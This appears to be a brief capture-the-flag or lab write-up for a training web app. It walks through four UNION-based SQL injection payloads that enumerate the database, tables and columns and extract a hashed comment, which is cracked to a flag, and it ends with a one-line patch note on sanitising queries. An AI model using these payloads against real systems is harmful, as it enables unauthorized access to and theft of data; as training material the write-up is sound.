# Tools

-[Hash analyzer](https://www.tunnelsup.com/hash-analyzer/#google_vignette)
-[Hex Encoder](https://www.convertstring.com/EncodeDecode/HexEncode)

# Exploit

1. `1 union all select database(), version()` to get the database name and it's version: `Member_images`
2. `1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()` to get tables name: `list_images`
3. We hex-encode the table name and use `1 union all select 1,group_concat(column_name) from Information_schema.columns where table_name=0x6C6973745F696D61676573` to get the columns: `id,url,title,comment`
4. `1 union all select 1,group_concat(comment,0x0a) from list_images` -> `1928e8083cf461a51303633093573c46` that we paste in google and it gives us `albatroz`

# Patch

Prepare the input and sanitize the query